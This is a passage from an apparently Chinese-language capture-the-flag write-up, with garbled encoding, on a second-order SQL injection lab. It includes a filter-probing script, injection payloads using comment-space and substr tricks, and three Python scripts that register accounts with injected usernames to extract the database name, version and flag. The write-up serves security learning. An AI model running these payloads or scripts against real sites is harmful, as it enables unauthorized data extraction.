data</span><br><span class="hljs-comment">#     # da = &quot;1 &#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     # da = &quot;1&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     da = &quot;1/**/&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     r = requests.get(url+da)</span><br><span class="hljs-comment">#     # ä½¿ç”¨timeä½¿è¯·æ±‚èƒ½å¤Ÿæ‹¥æœ‰è¶³å¤Ÿçš„æ—¶é—´å»å“åº”</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     # è·å–è¿‡æ»¤ç½‘ç«™å“åº”ä¿¡æ¯</span><br><span class="hljs-comment">#     reponse_txt = &quot;ä½ è¿˜æƒ³æ‰§è¡Œ&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         black_list.append(data)</span><br><span class="hljs-comment">#         print(&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;.format(data))</span><br><br><span class="hljs-comment"># POSTè¯·æ±‚</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data_list:<br>    <span class="hljs-comment"># da = d</span><br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(d)</span><br>    da = <span class="hljs-string">&quot;1&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d)<br>    <span class="hljs-comment"># POSTä¼ è¾“jsonæ•°æ®</span><br>    payload = &#123;<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&#x27;1235@qq.com&#x27;</span>,<br>        <span class="hljs-string">&quot;username&quot;</span>: da,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&#x27;123&#x27;</span><br>    &#125;<br>    r = requests.post(url=url, data=payload)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    reponse_txt = <span class="hljs-string">&quot;nnnnoooo!!!&quot;</span><br>    <span class="hljs-comment"># print(r.text)</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        black_list.append(d)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d))<br>    <span class="hljs-keyword">else</span>:<br>        white_list.append(d)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;é»‘åå•æ•°æ®:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(black_list))<br><span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç™½åå•æ•°æ®:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(white_list))<br></code></pre></td></tr></table></figure><h4 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º:"></a>è¾“å‡º:</h4><p><img src="/images/2024-2-18/image-20240215153203778.png" alt="image-20240215153203778"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">é»‘åå•æ•°æ®:[&#x27;INFORMATION&#x27;, &#x27;information_schema.tables&#x27;, &#x27;,&#x27;]<br></code></pre></td></tr></table></figure><p>é€šè¿‡é»‘åå•æ•°æ®æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨â€™,â€™,æ‰€ä»¥è¦é‡æ–°æ„é€ ascii(substr(database(),1,1))</p><h3 id="é‡æ–°æ„é€ payload"><a href="#é‡æ–°æ„é€ payload" class="headerlink" title="é‡æ–°æ„é€ payload:"></a>é‡æ–°æ„é€ payload:</h3><p><strong>å¯ä»¥åˆ©ç”¨mysqlçš„substr()å‡½æ•°çš„from x for lenè·å–å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦</strong></p><h4 id="sql1-1"><a href="#sql1-1" class="headerlink" title="sql1:"></a>sql1:</h4><p>è·å–ç¬¬ä¸€ä¸ªå­—ç¬¦</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select substr(&#x27;abcdef&#x27; from 1 for 1)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215153802945.png" alt="image-20240215153802945"></p><h4 id="sql2-1"><a href="#sql2-1" class="headerlink" title="sql2:"></a>sql2:</h4><p>è·å–ç¬¬äºŒä¸ªå­—ç¬¦</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select substr(&#x27;abcdef&#x27; from 2 for 1)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215153833878.png" alt="image-20240215153833878"></p><h4 id="sql3-1"><a href="#sql3-1" class="headerlink" title="sql3:"></a>sql3:</h4><p>è·å–ä»ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹çš„ä¸‰ä¸ªå­—ç¬¦</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select substr(&#x27;abcdef&#x27; from 2 for 3)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215153930664.png" alt="image-20240215153930664"></p><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">email=666%40qq.com&amp;username=0&#x27;+ascii(substr(database()/**/from/**/1/**/for/**/1))+&#x27;0&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215154856317.png" alt="image-20240215154856317"></p><p><img src="/images/2024-2-18/image-20240215154919699.png" alt="image-20240215154919699"></p><p>æˆåŠŸè·å–åˆ°æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç ä¸º119&#x3D;&gt;å­—ç¬¦â€™wâ€™</p><h3 id="æ ¹æ®payloadæ„é€ çˆ†ç ´è„šæœ¬"><a href="#æ ¹æ®payloadæ„é€ çˆ†ç ´è„šæœ¬" class="headerlink" title="æ ¹æ®payloadæ„é€ çˆ†ç ´è„šæœ¬:"></a>æ ¹æ®payloadæ„é€ çˆ†ç ´è„šæœ¬:</h3><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ä½¿ç”¨è„šæœ¬åœ¨register.phpé¡µé¢ä¸Šä¼ æˆ‘ä»¬çš„payload,ç„¶åæ ¹æ®äºŒæ¬¡æ³¨å…¥å¯¹çš„åŸç†ï¼Œåœ¨index.phpç•Œé¢è·å–ç”¨æˆ·åçš„å€¼ï¼Œæœ€ç»ˆå°†æ•°æ®æ‹¼æ¥æˆå®Œæ•´çš„ä¿¡æ¯ã€‚<br></code></pre></td></tr></table></figure><h4 id="çˆ†æ•°æ®åº“è„šæœ¬"><a href="#çˆ†æ•°æ®åº“è„šæœ¬" class="headerlink" title="çˆ†æ•°æ®åº“è„šæœ¬:"></a>çˆ†æ•°æ®åº“è„šæœ¬:</h4><h5 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬:"></a>è„šæœ¬:</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># register.phpç•Œé¢</span><br>url1 = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/register.php&quot;</span><br><span class="hljs-comment"># login.phpç•Œé¢</span><br>url2 = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/login.php&quot;</span><br><span class="hljs-comment"># index.phpç•Œé¢</span><br>url3 = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/index.php&quot;</span><br><br><span class="hljs-comment"># è®¾ç½®æ•°æ®åº“åçš„é•¿åº¦</span><br>database_len = <span class="hljs-number">30</span><br><br>database = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, database_len):<br>    <span class="hljs-comment"># æ³¨å†Œ</span><br>    paylaod = <span class="hljs-string">&quot;0&#x27;+ascii(substr(database()/**/from/**/&#123;&#125;/**/for/**/1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    data1 = &#123;<br>        <span class="hljs-comment"># è®¾ç½®ä¸åŒçš„email</span><br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;s1&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;username&quot;</span>: paylaod,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>        <br>    &#125;<br>    <span class="hljs-built_in">print</span>(data1)<br>    <span class="hljs-comment"># ä¸Šä¼ æ³¨å†Œä¿¡æ¯</span><br>    r1 = requests.post(url=url1, data=data1)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># ç™»å½•</span><br>    data2 = &#123;<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;s1&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>    &#125;<br>    <span class="hljs-built_in">print</span>(data2)<br>    <span class="hljs-comment"># ç”±äºlogin.phpç™»å½•ålocationä¸ºindex.php,æ‰€ä»¥ç›´æ¥é‡å®šå‘åˆ°index.phpç•Œé¢</span><br>    <span class="hljs-comment"># å›æ˜¾çš„å†…å®¹ä¹Ÿä¸ºindex.phpç•Œé¢çš„</span><br>    r2 = requests.post(url=url2, data=data2)<br>    <span class="hljs-comment"># print(r2.text)</span><br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># è®¿é—®index.php</span><br>    <span class="hljs-comment"># r3 = requests.post(url=url3, data=data2)</span><br>    <span class="hljs-comment"># time.sleep(0.03)</span><br>    <span class="hljs-comment"># print(r3.text)</span><br>    <span class="hljs-comment"># è·å–usernameæ˜¾ç¤ºçš„å€¼</span><br>    soup = BeautifulSoup(r2.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    span_elements = soup.find_all(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)<br>    <span class="hljs-comment"># print(span_elements)</span><br>    uername_span_value = span_elements[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># print(uername_span_value)</span><br>    <span class="hljs-comment"># å›æ˜¾å…ƒç´ é‡Œé¢çš„å†…å®¹</span><br>    <span class="hljs-comment"># print(uername_span_value.text)</span><br>    <br>    <span class="hljs-comment"># ä½¿ç”¨æ­£åˆ™æå–é‡Œé¢çš„æ•°å€¼</span><br>    <span class="hljs-comment"># pattern = r&#x27;&lt;span\s+class=&quot;user-name&quot;&gt;\s*(\d+)\s*&lt;/span&gt;&#x27;</span><br>    <span class="hljs-comment"># match = re.search(pattern, r2.text)</span><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, uername_span_value.text)<br>    <span class="hljs-comment"># è·å–åŒ¹é…çš„å†…å®¹</span><br>    <span class="hljs-keyword">match</span> = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br>    database = database + <span class="hljs-built_in">chr</span>(<span class="hljs-keyword">match</span>)<br>    <br><span class="hljs-built_in">print</span>(database)<br></code></pre></td></tr></table></figure><h5 id="è¾“å‡º-1"><a href="#è¾“å‡º-1" class="headerlink" title="è¾“å‡º:"></a>è¾“å‡º:</h5><p><img src="/images/2024-2-18/image-20240215171342866.png" alt="image-20240215171342866"></p><p>æ•°æ®åº“åä¸ºweb</p><h3 id="çˆ†æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯"><a href="#çˆ†æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="çˆ†æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯:"></a>çˆ†æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯:</h3><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">paylaod = &quot;0&#x27;+ascii(substr((select/**/VERSION())/**/from/**/&#123;&#125;/**/for/**/1))+&#x27;0&quot;.format(i)<br></code></pre></td></tr></table></figure><h5 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬:"></a>è„šæœ¬:</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># register.phpç•Œé¢</span><br>url1 = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/register.php&quot;</span><br><span class="hljs-comment"># login.phpç•Œé¢</span><br>url2 = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/login.php&quot;</span><br><span class="hljs-comment"># index.phpç•Œé¢</span><br>url3 = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/index.php&quot;</span><br><br><span class="hljs-comment"># è®¾ç½®æ•°æ®åº“åçš„é•¿åº¦</span><br>version_len = <span class="hljs-number">30</span><br><br>version = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, version_len):<br>    <span class="hljs-comment"># æ³¨å†Œ</span><br>    paylaod = <span class="hljs-string">&quot;0&#x27;+ascii(substr((select/**/VERSION())/**/from/**/&#123;&#125;/**/for/**/1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    data1 = &#123;<br>        <span class="hljs-comment"># è®¾ç½®ä¸åŒçš„email</span><br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;s2&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;username&quot;</span>: paylaod,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>        <br>    &#125;<br>    <span class="hljs-built_in">print</span>(data1)<br>    <span class="hljs-comment"># ä¸Šä¼ æ³¨å†Œä¿¡æ¯</span><br>    r1 = requests.post(url=url1, data=data1)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># ç™»å½•</span><br>    data2 = &#123;<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;s2&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>    &#125;<br>    <span class="hljs-built_in">print</span>(data2)<br>    <span class="hljs-comment"># ç”±äºlogin.phpç™»å½•ålocationä¸ºindex.php,æ‰€ä»¥ç›´æ¥é‡å®šå‘åˆ°index.phpç•Œé¢</span><br>    <span class="hljs-comment"># å›æ˜¾çš„å†…å®¹ä¹Ÿä¸ºindex.phpç•Œé¢çš„</span><br>    r2 = requests.post(url=url2, data=data2)<br>    <span class="hljs-comment"># print(r2.text)</span><br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># è®¿é—®index.php</span><br>    <span class="hljs-comment"># r3 = requests.post(url=url3, data=data2)</span><br>    <span class="hljs-comment"># time.sleep(0.03)</span><br>    <span class="hljs-comment"># print(r3.text)</span><br>    <span class="hljs-comment"># è·å–usernameæ˜¾ç¤ºçš„å€¼</span><br>    soup = BeautifulSoup(r2.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    span_elements = soup.find_all(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)<br>    <span class="hljs-comment"># print(span_elements)</span><br>    uername_span_value = span_elements[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># print(uername_span_value)</span><br>    <span class="hljs-comment"># å›æ˜¾å…ƒç´ é‡Œé¢çš„å†…å®¹</span><br>    <span class="hljs-comment"># print(uername_span_value.text)</span><br>    <br>    <span class="hljs-comment"># ä½¿ç”¨æ­£åˆ™æå–é‡Œé¢çš„æ•°å€¼</span><br>    <span class="hljs-comment"># pattern = r&#x27;&lt;span\s+class=&quot;user-name&quot;&gt;\s*(\d+)\s*&lt;/span&gt;&#x27;</span><br>    <span class="hljs-comment"># match = re.search(pattern, r2.text)</span><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, uername_span_value.text)<br>    <span class="hljs-comment"># è·å–åŒ¹é…çš„å†…å®¹</span><br>    <span class="hljs-keyword">match</span> = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br>    version = version + <span class="hljs-built_in">chr</span>(<span class="hljs-keyword">match</span>)<br>    <br><span class="hljs-built_in">print</span>(version)<br></code></pre></td></tr></table></figure><h5 id="è¾“å‡º-2"><a href="#è¾“å‡º-2" class="headerlink" title="è¾“å‡º:"></a>è¾“å‡º:</h5><p><img src="/images/2024-2-18/image-20240215172813980.png" alt="image-20240215172813980"></p><p>æ•°æ®åº“ç‰ˆæœ¬ä¸º5.5.64ï¼Œä¸èƒ½ä½¿ç”¨5.7ä»¥ä¸Šçš„sys.schema_table_statistics_with_bufferæ¥è·å–è¡¨åï¼Œä»¥åŠ5.6ä»¥ä¸Šçš„mysql.innodb_table_stats,æŸ¥äº†å¾ˆå¤šèµ„æ–™5.5ç‰ˆæœ¬å¥½åƒæ²¡æœ‰å…¶ä»–æ–¹å¼è·å–è¡¨ä¿¡æ¯ï¼Œçœ‹äº†å…¶ä»–å¸ˆå‚…çš„wpå¥½åƒflagéƒ½æ˜¯çŒœå‡ºæ¥çš„ï¼Œé‚£ä¹Ÿåªèƒ½çŒœflagå°±åœ¨flagè¡¨ä¸­ï¼Œä¸”ä¸ºflagè¡¨çš„å”¯ä¸€è®°å½•ï¼Œå”¯ä¸€å­—æ®µã€‚</p><h3 id="çˆ†flagè¡¨çš„å”¯ä¸€è®°å½•å”¯ä¸€å­—æ®µå€¼"><a href="#çˆ†flagè¡¨çš„å”¯ä¸€è®°å½•å”¯ä¸€å­—æ®µå€¼" class="headerlink" title="çˆ†flagè¡¨çš„å”¯ä¸€è®°å½•å”¯ä¸€å­—æ®µå€¼:"></a>çˆ†flagè¡¨çš„å”¯ä¸€è®°å½•å”¯ä¸€å­—æ®µå€¼:</h3><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">paylaod = &quot;0&#x27;+ascii(substr((select/**/*/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))+&#x27;0&quot;.format(i)<br></code></pre></td></tr></table></figure><h4 id="è„šæœ¬-2"><a href="#è„šæœ¬-2" class="headerlink" title="è„šæœ¬:"></a>è„šæœ¬:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># register.phpç•Œé¢</span><br>url1 = <span class="hljs-string">&quot;http://673f044a-226c-4eb8-90d5-cf820ba8c828.node5.buuoj.cn:81/register.php&quot;</span><br><span class="hljs-comment"># login.phpç•Œé¢</span><br>url2 = <span class="hljs-string">&quot;http://673f044a-226c-4eb8-90d5-cf820ba8c828.node5.buuoj.cn:81/login.php&quot;</span><br><span class="hljs-comment"># index.phpç•Œé¢</span><br>url3 = <span class="hljs-string">&quot;http://673f044a-226c-4eb8-90d5-cf820ba8c828.node5.buuoj.cn:81/index.php&quot;</span><br><br><span class="hljs-comment"># è®¾ç½®æ•°æ®åº“åçš„é•¿åº¦</span><br>flag_len = <span class="hljs-number">50</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, flag_len):<br>    <span class="hljs-comment"># æ³¨å†Œ</span><br>    paylaod = <span class="hljs-string">&quot;0&#x27;+ascii(substr((select/**/*/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    data1 = &#123;<br>        <span class="hljs-comment"># è®¾ç½®ä¸åŒçš„email</span><br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;s3&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;username&quot;</span>: paylaod,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>        <br>    &#125;<br>    <span class="hljs-built_in">print</span>(data1)<br>    <span class="hljs-comment"># ä¸Šä¼ æ³¨å†Œä¿¡æ¯</span><br>    r1 = requests.post(url=url1, data=data1)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># ç™»å½•</span><br>    data2 = &#123;<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;s3&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>    &#125;<br>    <span class="hljs-built_in">print</span>(data2)<br>    <span class="hljs-comment"># ç”±äºlogin.phpç™»å½•ålocationä¸ºindex.php,æ‰€ä»¥ç›´æ¥é‡å®šå‘åˆ°index.phpç•Œé¢</span><br>    <span class="hljs-comment"># å›æ˜¾çš„å†…å®¹ä¹Ÿä¸ºindex.phpç•Œé¢çš„</span><br>    r2 = requests.post(url=url2, data=data2)<br>    <span class="hljs-comment"># print(r2.text)</span><br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># è®¿é—®index.php</span><br>    <span class="hljs-comment"># r3 = requests.post(url=url3, data=data2)</span><br>    <span class="hljs-comment"># time.sleep(0.03)</span><br>    <span class="hljs-comment"># print(r3.text)</span><br>    <span class="hljs-comment"># è·å–usernameæ˜¾ç¤ºçš„å€¼</span><br>    soup = BeautifulSoup(r2.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    span_elements = soup.find_all(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)<br>    <span class="hljs-comment"># print(span_elements)</span><br>    uername_span_value = span_elements[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># print(uername_span_value)</span><br>    <span class="hljs-comment"># å›æ˜¾å…ƒç´ é‡Œé¢çš„å†…å®¹</span><br>    <span class="hljs-comment"># print(uername_span_value.text)</span><br>    <br>    <span class="hljs-comment"># ä½¿ç”¨æ­£åˆ™æå–é‡Œé¢çš„æ•°å€¼</span><br>    <span class="hljs-comment"># pattern = r&#x27;&lt;span\s+class=&quot;user-name&quot;&gt;\s*(\d+)\s*&lt;/span&gt;&#x27;</span><br>    <span class="hljs-comment"># match = re.search(pattern, r2.text)</span><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, uername_span_value.text)<br>    <span class="hljs-comment"># è·å–åŒ¹é…çš„å†…å®¹</span><br>    <span class="hljs-keyword">match</span> = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br>    flag = flag + <span class="hljs-built_in">chr</span>(<span class="hljs-keyword">match</span>)<br>    <br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h4 id="è¾“å‡ºï¼š"><a href="#è¾“å‡ºï¼š" class="headerlink" title="è¾“å‡ºï¼š"></a>è¾“å‡ºï¼š</h4><p><img src="/images/2024-2-18/image-20240215210700429.png" alt="image-20240215210700429"></p><p>flag&#x3D;flag{8e13d363-3905-4f76-8f9a-b9e17c008355}</p><h3 